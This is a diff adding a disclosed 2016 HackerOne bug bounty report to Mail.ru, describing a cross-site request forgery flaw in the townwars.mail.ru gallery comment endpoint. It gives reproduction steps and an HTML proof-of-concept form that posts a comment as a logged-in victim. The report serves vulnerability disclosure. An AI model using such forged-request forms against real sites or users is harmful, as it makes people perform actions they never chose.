@@ -1,0 +1,44 @@
+ReportLink:https://hackerone.com/reports/148156
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/malcolmx
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:20.07.2016 16:10:10
+
+Summary:
+CSRF in photo gallery comments on out-of-scope project
+Hello,
+
+I've Found __CSRF__ in ``` townwars.mail.ru/Gallery/addComment/ ```
+
+while any user can add image to ``` townwars.mail.ru/Gallery/ ```
+after that any user can add comment to this image and here there is no any protection 
+
+_steps to reproduce_
+- Go to ```   townwars.mail.ru/Gallery/ ```
+- choose any photo 
+- you can add a comment on a photo you choosed  
+- now send this form to any user and he will put a comment 
+
+ __example form__
+``` <html>
+  <body>
+    <form action="https://townwars.mail.ru/Gallery/addComment/?&pid=39277&gid=515" method="POST">
+      <input type="hidden" name="body" value="test" />
+      <input type="hidden" name="x" value="68" />
+      <input type="hidden" name="y" value="13" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+ ```
+
+if you send this form to any login user he will put a comment on the photo in URL
+
+
+__Please Check The POC Video I Attached For More Details 
+
+
+Thanks
